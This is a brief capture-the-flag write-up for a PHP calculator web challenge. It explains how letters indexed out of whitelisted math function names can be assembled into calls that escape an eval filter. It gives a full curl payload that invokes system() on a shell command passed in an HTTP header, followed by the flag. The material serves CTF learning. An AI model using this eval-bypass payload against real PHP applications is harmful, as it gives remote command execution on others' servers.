# Calc.exe Online (Web)
This is a typical PHP pain challenge. Our input can consist of any characters in `_abcdefghijklmnopqrstuvwxyz0123456789.!^&|+-*/%()[],`, and the result is eval'd once. The trick is any letters must match an allowed function name, which are just safe math functions.

Fortunately for us, PHP is a hell of a language and function names that aren't called are treated as constant strings. Not only that, we can call functions using a string containing its name like any other function.

We just need to use letters from the names of allowed functions to construct the function names we want. I decided to assemble `system(end(getallheaders())` to easily pass in shell commands.

```
> curl -g "http://chall.ctf.bamboofox.tw:13377/?expression=(asin[1].hypot[1].asin[1].atan[1].ceil[1].fmod[1])((exp[0].min[2].fmod[3])((log[2].exp[0].tan[0].abs[0].log[0].log[0].cosh[3].exp[0].abs[0].fmod[3].exp[0].ncr[2].abs[2])()))" -H "zzz: ls -la /"
flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}
```
